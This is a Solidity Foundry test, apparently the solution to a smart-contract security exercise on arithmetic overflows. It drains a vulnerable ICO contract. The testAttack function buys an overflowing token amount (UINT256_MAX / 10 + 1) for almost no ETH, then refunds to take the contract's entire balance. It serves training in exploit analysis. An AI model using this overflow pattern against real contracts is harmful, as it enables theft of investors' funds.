// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import {AIvestICO} from "../../src/4. Arithmetic Overflows-3/AIvestICO.sol";
import {AIvestToken} from "../../src/4. Arithmetic Overflows-3/AIvestToken.sol";

contract TestAIvestICO is Test {
    AIvestICO ico;
    AIvestToken token;

    address deployer = makeAddr("deployer");
    address investor1 = makeAddr("investor1");
    address investor2 = makeAddr("investor2");
    address investor3 = makeAddr("investor3");
    address attacker = makeAddr("attacker");

    uint256 constant FIRST_INVESTOR_INVESTED = 520 ether;
    uint256 constant SECOND_INVESTOR_INVESTED = 126 ether;
    uint256 constant THIRD_INVESTOR_INVESTED = 54 ether;
    uint256 constant SECOND_INVESTOR_REFUNDED = 26 ether;

    uint256 constant TOTAL_INVESTED = FIRST_INVESTOR_INVESTED + SECOND_INVESTOR_INVESTED + THIRD_INVESTOR_INVESTED;
    uint256 constant TOTAL_INVESTED_AFTER_REFUND =
        FIRST_INVESTOR_INVESTED + SECOND_INVESTOR_INVESTED + THIRD_INVESTOR_INVESTED - SECOND_INVESTOR_REFUNDED;

    uint256 constant ATTACKER_BALANCE = 1 ether;

    function setUp() public {
        vm.prank(deployer);
        ico = new AIvestICO();
        token = ico.token();
        vm.deal(investor1, FIRST_INVESTOR_INVESTED);
        vm.deal(investor2, SECOND_INVESTOR_INVESTED);
        vm.deal(investor3, THIRD_INVESTOR_INVESTED);
        vm.deal(attacker, ATTACKER_BALANCE);

        assertEq(attacker.balance, 1 ether);
    }

    function testAttack() public {
        // Should Fail (no ETH)
        vm.prank(investor1);
        vm.expectRevert("wrong ETH amount sent");
        ico.buy(FIRST_INVESTOR_INVESTED * 10);

        // Should Succeed
        vm.prank(investor1);
        ico.buy{value: FIRST_INVESTOR_INVESTED}(FIRST_INVESTOR_INVESTED * 10);

        vm.prank(investor2);
        ico.buy{value: SECOND_INVESTOR_INVESTED}(SECOND_INVESTOR_INVESTED * 10);

        vm.prank(investor3);
        ico.buy{value: THIRD_INVESTOR_INVESTED}(THIRD_INVESTOR_INVESTED * 10);

        // Tokens and ETH balance checks
        assertEq(token.balanceOf(investor1), FIRST_INVESTOR_INVESTED * 10);
        assertEq(token.balanceOf(investor2), SECOND_INVESTOR_INVESTED * 10);
        assertEq(token.balanceOf(investor3), THIRD_INVESTOR_INVESTED * 10);

        assertEq(address(ico).balance, TOTAL_INVESTED);

        // Should Fail(investor doesn't own so many tokens)
        vm.prank(investor2);
        vm.expectRevert("ERC20: burn amount exceeds balance");
        ico.refund(SECOND_INVESTOR_INVESTED * 100);

        // Should succeed
        vm.prank(investor2);
        ico.refund(SECOND_INVESTOR_REFUNDED * 10);

        // Tokens and ETH balance check
        assertEq(address(ico).balance, TOTAL_INVESTED_AFTER_REFUND);
        assertEq(token.balanceOf(investor2), (SECOND_INVESTOR_INVESTED - SECOND_INVESTOR_REFUNDED) * 10);

        vm.startPrank(attacker);

        uint256 tokensToBuy = UINT256_MAX / 10 + 1;
        ico.buy(tokensToBuy);
        uint256 contractETHBalance = address(ico).balance;
        ico.refund(contractETHBalance * 10);

        vm.stopPrank();

        // Attacker should drain all ETH from ICO contract
        assertEq(address(ico).balance, 0);
        assertGt(address(attacker).balance, TOTAL_INVESTED_AFTER_REFUND);
    }
}
